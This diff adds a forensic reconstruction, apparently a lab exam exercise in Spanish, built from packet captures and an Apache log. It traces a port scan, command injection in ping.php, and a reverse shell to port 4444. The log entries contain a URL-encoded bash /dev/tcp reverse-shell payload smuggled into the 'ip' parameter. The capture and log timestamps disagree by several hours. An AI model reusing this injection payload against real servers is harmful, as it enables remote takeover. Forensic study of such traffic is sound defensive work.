@@ -1,0 +1,41 @@
+############ Punto 4 - Reconstruccion forense (analisis de pcaps en base) ############
+
+===== pcaps capturados =====
+-rw-r--r-- 1 tcpdump tcpdump   8046 Sep 10 07:51 /home/user1/parcial/p4/p4_dmz.pcap
+-rw-r--r-- 1 tcpdump tcpdump 202526 Sep 10 07:51 /home/user1/parcial/p4/p4_ext.pcap
+
+===== FASE RECON: SYNs de 10.5.0.10 -> dmza (barrido de puertos) =====
+Total SYN scan packets:
+9
+Primeros puertos sondeados (time_rel -> dstport):
+0.000000000	80
+0.000041000	443
+0.002451000	80
+0.002458000	443
+1.305133000	80
+2.608018000	80
+3.910696000	80
+4.427102000	80
+5.450608000	80
+
+===== FASE ACCESO INICIAL: peticiones HTTP (inyeccion) =====
+Sep 10, 2026 07:50:25.269844000 CEST	10.5.0.10	10.5.1.10	http://www.example.net/ping.php?ip=127.0.0.1;id
+Sep 10, 2026 07:50:26.293414000 CEST	10.5.0.10	10.5.1.10	http://www.example.net/ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4444%200%3E%261%27
+
+===== FASE EXPLOTACION: reverse shell puerto 4444 =====
+Sep 10, 2026 07:50:26.298207000 CEST	10.5.1.10	10.5.0.10	4444	0x0002
+Sep 10, 2026 07:50:26.298554000 CEST	10.5.0.10	10.5.1.10	46660	0x0012
+Sep 10, 2026 07:50:26.299514000 CEST	10.5.1.10	10.5.0.10	4444	0x0010
+Sep 10, 2026 07:50:26.301386000 CEST	10.5.1.10	10.5.0.10	4444	0x0018
+Sep 10, 2026 07:50:26.301631000 CEST	10.5.0.10	10.5.1.10	46660	0x0010
+Sep 10, 2026 07:50:26.302147000 CEST	10.5.1.10	10.5.0.10	4444	0x0018
+Sep 10, 2026 07:50:26.302365000 CEST	10.5.0.10	10.5.1.10	46660	0x0010
+Sep 10, 2026 07:50:26.801770000 CEST	10.5.0.10	10.5.1.10	46660	0x0018
+
+===== CORRELACION: log de Apache en dmza (ping.php) =====
+10.5.0.10 - - [10/Sep/2026:04:58:25 +0200] "GET /ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4444%200%3E%261%27 HTTP/1.1" 200 503 "-" "curl/7.88.1"
+10.5.0.10 - - [10/Sep/2026:04:59:26 +0200] "GET /ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4445%200%3E%261%27 HTTP/1.1" 200 503 "-" "curl/7.88.1"
+10.5.0.10 - - [10/Sep/2026:05:00:17 +0200] "GET /ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4446%200%3E%261%27 HTTP/1.1" 200 503 "-" "curl/7.88.1"
+127.0.0.1 - - [10/Sep/2026:05:04:51 +0200] "GET /ping.php?ip=127.0.0.1;id HTTP/1.1" 200 557 "-" "curl/7.88.1"
+10.5.0.10 - - [10/Sep/2026:05:12:50 +0200] "GET /ping.php?ip=127.0.0.1;id HTTP/1.1" 200 557 "-" "curl/7.88.1"
+10.5.0.10 - - [10/Sep/2026:05:12:51 +0200] "GET /ping.php?ip=127.0.0.1;bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.5.0.10/4444%200%3E%261%27 HTTP/1.1" 200 503 "-" "curl/7.88.1"
